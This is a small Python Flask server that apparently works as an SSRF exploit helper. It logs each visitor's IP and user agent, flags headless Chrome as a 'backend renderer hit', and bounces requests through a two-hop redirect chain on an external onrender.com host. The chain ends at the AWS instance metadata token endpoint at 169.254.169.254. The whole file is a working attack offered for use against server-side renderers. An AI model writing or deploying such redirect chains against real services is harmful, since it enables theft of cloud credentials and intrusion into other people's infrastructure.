from flask import Flask, redirect, request

app = Flask(__name__)

def log_request(label):
    real_ip = request.headers.get("Cf-Connecting-Ip") or \
              request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
    ua = request.headers.get("User-Agent", "none")
    is_headless = "HeadlessChrome" in ua
    print(f"\n[{label}]")
    print(f"  Real IP : {real_ip}")
    print(f"  UA      : {ua}")
    print(f"  Headless: {is_headless}")
    print(f"  {'⚠️  BACKEND RENDERER HIT' if is_headless else '(your browser)'}")

@app.route("/hop1")
def hop1():
    log_request("HOP1")
    # redirect back to your own server first
    return redirect("https://ssrf-gnd4.onrender.com/hop2", code=301)

@app.route("/hop2")
def hop2():
    log_request("HOP2 — REDIRECT FOLLOWED")
    # only now redirect to the actual target
    return redirect(
        "http://169.254.169.254/latest/api/token",
        code=301
    )

@app.route("/")
def index():
    return "ok", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
